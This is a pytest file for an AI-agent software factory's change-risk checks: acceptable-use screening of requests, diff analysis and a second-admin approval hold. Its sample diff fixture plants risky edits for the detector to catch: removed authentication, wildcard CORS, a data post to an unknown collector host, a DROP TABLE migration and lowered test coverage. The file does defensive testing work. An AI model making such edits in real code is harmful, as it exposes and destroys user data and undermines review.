"""Change risk (ADR-0027): work an acceptable-use rule forbids is refused at the door;
a risky diff waits for an admin other than the requester; every decision is evidence."""

from __future__ import annotations

import json
from datetime import timedelta

import pytest
from conftest import PRODUCT, wait_run
from test_access import ADMIN, MEMBER
from test_api import _client

from agent_factory import risk
from agent_factory.agents import FakeAgentRunner
from agent_factory.config import AcceptableUseRule
from agent_factory.engine.pipeline import FactoryError, RefusedError
from agent_factory.models import ChangeStatus, CreateProductInput
from agent_factory.workflow import load_workflow_dir, workflow_warnings

# an operator's own rule, so the tests exercise refusal without harmful examples
TEST_RULE = AcceptableUseRule(id="test-forbidden", title="test rule", pattern=r"\bforbidden widget\b")


# --------------------------------------------------------- acceptable use --
@pytest.mark.parametrize(
    "text",
    [
        "Save bookmarks with tags and filter by tag",
        "A URL shortener that counts visits",
        "A spam filter for our support inbox",
        "Phishing awareness training: a quiz that teaches staff to report suspicious emails",
        "Detect malware uploads by scanning files with ClamAV",
        "Track delivery drivers' locations for dispatch, shown to the drivers themselves",
    ],
)
def test_ordinary_and_defensive_requests_pass(text: str) -> None:
    assert risk.screen_request(text) is None


def test_the_shipped_rules_have_ids_and_titles_and_compile() -> None:
    import re

    ids = [r.id for r in risk.DEFAULT_AUP]
    assert len(ids) == len(set(ids)) and all(i.startswith("aup-") for i in ids)
    for r in risk.DEFAULT_AUP:
        re.compile(r.pattern)
        assert r.title


def test_an_operator_rule_adds_to_the_shipped_ones() -> None:
    extra = [risk.AupRule(TEST_RULE.id, TEST_RULE.title, TEST_RULE.pattern)]
    got = risk.screen_request("Please build a Forbidden Widget service", extra)
    assert got and got.rule == "test-forbidden" and "Forbidden Widget" in got.matched
    assert "refused by acceptable-use rule test-forbidden" in got.message()
    assert risk.screen_request("Please build a widget service", extra) is None


async def test_a_refused_order_is_never_created_and_is_audited(make_factory) -> None:
    f = make_factory()
    f.cfg.change_risk.acceptable_use.append(TEST_RULE)
    app, ctx, c = await _client(f)
    async with c:
        r = await c.post("/api/products", json={"title": "Widgets", "requirements": "A forbidden widget registry"})
        assert r.status_code == 422 and "test-forbidden" in r.json()["detail"]
    await ctx.__aexit__(None, None, None)
    assert f.store.list_products() == []
    audit = [json.loads(x) for x in (f.manager.ws.data_dir / "audit" / "refusals.jsonl").read_text().splitlines()]
    assert audit[0]["rule"] == "test-forbidden" and audit[0]["what"] == "product"


async def test_feedback_is_screened_too(make_factory) -> None:
    f = make_factory()
    f.cfg.change_risk.acceptable_use.append(TEST_RULE)
    product = f.manager.create_product(PRODUCT)
    change = f.manager.start_change(product)
    assert await wait_run(f, change.id) == ChangeStatus.awaiting_feedback
    with pytest.raises(RefusedError):
        f.manager.feedback(product.id, "now turn it into a forbidden widget")


# ------------------------------------------------------------------- diffs --
DIFF = """\
diff --git a/app/main.py b/app/main.py
index 1..2 100644
--- a/app/main.py
+++ b/app/main.py
@@ -10,2 +10,3 @@ app = FastAPI()
-@app.get("/items", dependencies=[Depends(get_current_user)])
+@app.get("/items")
+app.add_middleware(CORSMiddleware, allow_origins=["*"])
@@ -40,0 +42,1 @@
+    httpx.post("https://collector.unknown-host.io/x", json=data)
diff --git a/tests/test_items.py b/tests/test_items.py
deleted file mode 100644
--- a/tests/test_items.py
+++ /dev/null
@@ -1,4 +0,0 @@
-import pytest
-def test_items():
-    assert True
-
diff --git a/migrations/002.sql b/migrations/002.sql
new file mode 100644
--- /dev/null
+++ b/migrations/002.sql
@@ -0,0 +1 @@
+DROP TABLE links;
diff --git a/Makefile b/Makefile
--- a/Makefile
+++ b/Makefile
@@ -5 +5 @@
-	pytest --cov=app --cov-fail-under=90
+	pytest --cov=app --cov-fail-under=50
diff --git a/docs/notes.md b/docs/notes.md
--- a/docs/notes.md
+++ b/docs/notes.md
@@ -1,0 +1 @@
+See https://somewhere-else.io for background
"""


def test_parse_diff_keeps_status_and_line_numbers() -> None:
    files = {f.path: f for f in risk.parse_diff(DIFF)}
    assert files["tests/test_items.py"].status == "deleted"
    assert files["migrations/002.sql"].status == "added"
    assert files["app/main.py"].added[0] == (10, '@app.get("/items")')
    assert files["app/main.py"].added[2][0] == 42


def test_each_category_is_found_and_docs_are_ignored() -> None:
    findings = risk.check_diff(risk.parse_diff(DIFF))
    rules = {f.rule for f in risk.holds(findings)}
    assert {
        "sec-auth-removed",
        "sec-cors-wildcard",
        "exf-new-host",
        "net-test-file-deleted",
        "net-tests-removed",
        "net-coverage-lowered",
        "data-drop",
    } <= rules
    assert {f.category for f in risk.holds(findings)} == {1, 2, 3, 4}
    assert not [f for f in findings if f.file.startswith("docs/")], "a link in the docs is not a call"
    assert findings[0].severity == "hold" and findings[0].category == 1, "most serious first"


def test_an_allowed_host_and_safe_hosts_are_not_findings() -> None:
    diff = 'diff --git a/app/x.py b/app/x.py\n@@ -1,0 +1,2 @@\n+URL = "https://api.partner.io/v1"\n+LOCAL = "http://localhost:8000"\n'
    assert [f.rule for f in risk.check_diff(risk.parse_diff(diff))] == ["exf-new-host"]
    assert risk.check_diff(risk.parse_diff(diff), ["*.partner.io"]) == []


def test_a_rename_or_a_moved_test_is_not_a_removal() -> None:
    diff = "diff --git a/tests/test_a.py b/tests/test_a.py\n@@ -1,1 +1,1 @@\n-def test_old():\n+def test_new():\n"
    assert risk.check_diff(risk.parse_diff(diff)) == []


def test_the_digest_ignores_line_numbers_but_not_content() -> None:
    a = risk.check_diff(risk.parse_diff(DIFF))
    b = risk.check_diff(risk.parse_diff(DIFF.replace("@@ -40,0 +42,1 @@", "@@ -60,0 +77,1 @@")))
    c = risk.check_diff(risk.parse_diff(DIFF.replace("unknown-host.io", "other-host.io")))
    assert risk.digest(a) == risk.digest(b) != risk.digest(c)


def test_the_templates_have_the_station_and_a_lane_without_it_is_flagged() -> None:
    from test_station_phases import DEFAULT

    doc = load_workflow_dir(DEFAULT)
    assert not [w for w in workflow_warnings(doc) if "no change-risk station" in w]
    doc.stations = [s for s in doc.stations if s.id != "change-risk"]
    assert [w for w in workflow_warnings(doc) if w.startswith("no change-risk station")]


# ------------------------------------------------------------ in the engine --
RISKY = {
    "app/debug_tools.py": 'from fastapi.middleware.cors import CORSMiddleware\nORIGINS = ["*"]\nallow_origins=["*"]\n'
}


async def _held(make_factory, created_by: str = "priya"):  # noqa: ANN202
    f = make_factory(agents=FakeAgentRunner(risky_once=dict(RISKY)))
    product = f.manager.create_product(PRODUCT)
    product.created_by = created_by
    f.store.save_product(product)
    change = f.manager.start_change(product)
    assert await wait_run(f, change.id) == ChangeStatus.awaiting_risk_approval
    return f, product, f.store.get_change(change.id)


async def test_a_risky_change_waits_for_a_second_admin_then_ships(make_factory) -> None:
    f, product, change = await _held(make_factory)
    assert change.risk_hold and change.risk_hold.requested_by == "priya" and change.risk_hold.findings == 1
    assert change.current_station == "change-risk" and "weakens security" in change.summary
    evidence = json.loads((f.manager.ws.data_dir / "artifacts" / change.id / "change-risk.json").read_text())
    assert [x["rule"] for x in evidence["findings"]] == ["sec-cors-wildcard"]

    f.settings.auth_mode = "gateway"
    app, ctx, c = await _client(f)
    async with c:
        view = (await c.get(f"/api/changes/{change.id}", headers=MEMBER)).json()["risk"]
        assert view["waiting"] and view["findings"][0]["file"] == "app/debug_tools.py"
        body = {"reason": "debug CORS is needed for the partner demo"}
        r = await c.post(f"/api/changes/{change.id}/risk/approve", json=body, headers=MEMBER)
        assert r.status_code == 403, "approving a risky change is admin work"
        r = await c.post(f"/api/changes/{change.id}/risk/approve", json=body, headers=ADMIN)
        assert r.status_code == 200
        assert await wait_run(f, change.id) == ChangeStatus.awaiting_feedback
    await ctx.__aexit__(None, None, None)

    done = f.store.get_change(change.id)
    assert done.risk_approvals[0].by == "saravana" and not done.risk_approvals[0].break_glass
    msgs = [e.message for e in f.store.list_events(change.id)]
    assert any(m.startswith("change risk: 1 risky change(s) approved by saravana") for m in msgs)


async def test_the_requester_needs_the_cooling_off_delay_and_is_flagged(make_factory) -> None:
    f, product, change = await _held(make_factory, created_by="saravana")
    with pytest.raises(FactoryError, match="break-glass in"):
        f.manager.approve_risk(change.id, "saravana", "I own this and accept the risk")
    later = change.risk_hold.since + timedelta(minutes=f.cfg.change_risk.cooling_off_minutes + 1)
    f.manager.approve_risk(change.id, "saravana", "single-admin install; accepted", now=later)
    assert await wait_run(f, change.id) == ChangeStatus.awaiting_feedback
    assert f.store.get_change(change.id).risk_approvals[0].break_glass


async def test_break_glass_can_be_turned_off(make_factory) -> None:
    f, product, change = await _held(make_factory, created_by="saravana")
    f.cfg.change_risk.break_glass = False
    later = change.risk_hold.since + timedelta(days=1)
    with pytest.raises(FactoryError, match="another admin must approve"):
        f.manager.approve_risk(change.id, "saravana", "I own this and accept the risk", now=later)


async def test_sent_back_the_change_is_fixed_and_checked_again(make_factory) -> None:
    f, product, change = await _held(make_factory)
    f.manager.send_back_risk(change.id, "saravana", "no wildcard CORS in this product")
    assert await wait_run(f, change.id) == ChangeStatus.awaiting_feedback
    agents = f.manager.agents
    dev = [c for c in agents.calls if c.role == "developer"]
    assert len(dev) == 2 and "no wildcard CORS in this product" in dev[1].prompt
    done = f.store.get_change(change.id)
    assert done.risk_approvals == [] and done.risk_hold is None
    assert any(
        m.startswith("risky changes sent back by saravana") for m in (e.message for e in f.store.list_events(change.id))
    )


async def test_ordinary_orders_are_not_held(make_factory) -> None:
    f = make_factory()
    change = f.manager.start_change(
        f.manager.create_product(CreateProductInput(title="Notes", requirements="Keep short notes."))
    )
    assert await wait_run(f, change.id) == ChangeStatus.awaiting_feedback
    assert any(e.message.startswith("change risk: no risky changes") for e in f.store.list_events(change.id))
